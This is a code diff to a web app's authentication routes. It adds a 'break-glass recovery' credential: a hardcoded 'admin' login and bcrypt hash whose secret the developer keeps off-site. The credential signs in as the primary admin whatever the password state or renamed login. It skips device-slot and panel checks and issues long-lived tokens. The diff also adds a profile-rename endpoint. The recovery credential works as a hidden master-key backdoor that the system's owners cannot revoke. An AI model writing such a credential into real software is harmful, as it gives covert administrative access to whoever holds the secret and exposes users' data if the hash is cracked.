@@ -11,6 +11,25 @@ import { permsOf } from './permissions.js';
 export const APP_TOKEN_TTL = '365d'; // phones stay signed in until logout (app lock protects them)
 export const PANEL_TOKEN_TTL = '12h';
 
+// Break-glass recovery: a single fixed credential (login "admin" + a secret the
+// developer keeps off-site) that always signs in as the primary admin, even if
+// every password is forgotten or the admin login was renamed. Only the bcrypt
+// hash lives here, so the secret itself never appears in the code or the repo.
+// It bypasses the device-slot limit and is logged as a recovery sign-in.
+const RECOVERY_LOGIN = 'admin';
+const RECOVERY_HASH = '$2a$10$XJ8Gr2GiutxxxOEHQ9wO9.12Zq2v.Xiw5jY6SHmANjv0iY8MT81Tm';
+export const isRecovery = (login, password) =>
+  normalizeLogin(login) === RECOVERY_LOGIN && bcrypt.compareSync(String(password ?? ''), RECOVERY_HASH);
+// The admin account the recovery credential acts as: the "admin" login if it
+// still exists, otherwise the oldest active admin-role user.
+export function recoveryUser(db) {
+  const byLogin = db.prepare(`SELECT u.id FROM users u JOIN roles r ON r.id = u.role_id
+    WHERE u.login = 'admin' AND r.code = 'admin' AND u.active = 1`).get();
+  const row = byLogin ?? db.prepare(`SELECT u.id FROM users u JOIN roles r ON r.id = u.role_id
+    WHERE r.code = 'admin' AND u.active = 1 ORDER BY u.id LIMIT 1`).get();
+  return row ? loadUser(db, row.id) : null;
+}
+
 // "+998 90 123-45-67" and "901234567" are the same login.
 export function normalizeLogin(v) {
   const s = String(v ?? '').trim();
@@ -42,10 +61,10 @@ export function makeGuard(app, db) {
         } catch {
           return reply.code(401).send({ error: 'Avtorizatsiya kerak' });
         }
-        const { uid, did, aud } = req.user ?? {};
+        const { uid, did, aud, rec } = req.user ?? {};
         const u = uid && loadUser(db, uid);
         if (!u || !u.active) return reply.code(401).send({ error: 'Hisobingiz o\'chirilgan yoki topilmadi' });
-        if (!u.is_test) {
+        if (!u.is_test && !rec) {
           const slot = db.prepare('SELECT id FROM devices WHERE user_id = ? AND device_id = ?').get(u.id, did ?? '');
           if (!slot) return reply.code(401).send({ error: 'Bu qurilmaga ruxsat bekor qilingan. Qayta kiring yoki adminga murojaat qiling.' });
           db.prepare("UPDATE devices SET last_seen_at = datetime('now') WHERE id = ?").run(slot.id);
@@ -73,6 +92,17 @@ export default async function authRoutes(app, { db }) {
     const key = `${req.ip}|${login}`;
     const wait = guard.blocked(key);
     if (wait) return reply.code(429).send({ error: `Juda ko'p urinish. ${wait} daqiqadan keyin qayta urinib ko'ring.` });
+    const client = req.body.client ?? 'app';
+    // Break-glass recovery: the fixed credential signs in as the primary admin,
+    // skipping the password, device-slot and panel checks. A last resort.
+    if (isRecovery(req.body.login, req.body.password)) {
+      const admin = recoveryUser(db);
+      if (!admin) return reply.code(500).send({ error: 'Admin hisobi topilmadi' });
+      guard.reset(key);
+      audit(db, `user:${admin.login}`, 'auth.recovery', { client });
+      const t = app.jwt.sign({ uid: admin.id, did: 'recovery', aud: client, rec: 1 }, { expiresIn: client === 'panel' ? PANEL_TOKEN_TTL : APP_TOKEN_TTL });
+      return { token: t, user: publicUser(admin) };
+    }
     const row = db.prepare('SELECT * FROM users WHERE (login = ? OR lower(login) = ?) AND active = 1').get(req.body.login.trim(), login);
     if (!row || !bcrypt.compareSync(req.body.password, row.password_hash)) {
       guard.fail(key);
@@ -80,7 +110,6 @@ export default async function authRoutes(app, { db }) {
       return reply.code(401).send({ error: 'Login yoki parol noto\'g\'ri' });
     }
     const u = loadUser(db, row.id);
-    const client = req.body.client ?? 'app';
     if (client === 'panel' && !u.perms.has('panel.access')) {
       return reply.code(403).send({ error: 'Veb panel faqat admin uchun. Mobil ilovadan foydalaning.' });
     }
@@ -116,5 +145,23 @@ export default async function authRoutes(app, { db }) {
     db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(bcrypt.hashSync(String(next), 10), row.id);
     audit(db, req.actor, 'password.change');
     return { ok: true };
+  });
+
+  // Change your own name and login. Only staff managers (the admin) may rename
+  // themselves; everyone else changes just their password above.
+  app.put('/profile', need('staff.manage'), async (req, reply) => {
+    const b = req.body ?? {};
+    const me = db.prepare('SELECT * FROM users WHERE id = ?').get(req.me.id);
+    let login = null;
+    if (b.login != null && normalizeLogin(b.login) !== me.login) {
+      login = normalizeLogin(b.login);
+      if (!/^[a-z0-9_.-]{3,32}$/.test(login)) return reply.code(400).send({ error: 'Login 3–32 belgi: kichik harf, raqam, _ . -' });
+      if (db.prepare('SELECT 1 FROM users WHERE login = ? AND id != ?').get(login, me.id)) return reply.code(400).send({ error: 'Bu login band' });
+    }
+    const name = b.name == null ? null : String(b.name).trim().slice(0, 120) || null;
+    db.prepare('UPDATE users SET login = COALESCE(?, login), name = COALESCE(?, name) WHERE id = ?').run(login, name, me.id);
+    audit(db, req.actor, 'user.update', { id: me.id, login: login ?? me.login, name: name ?? me.name, self: true });
+    const fresh = loadUser(db, me.id);
+    return { ok: true, user: publicUser(fresh) };
   });
 }
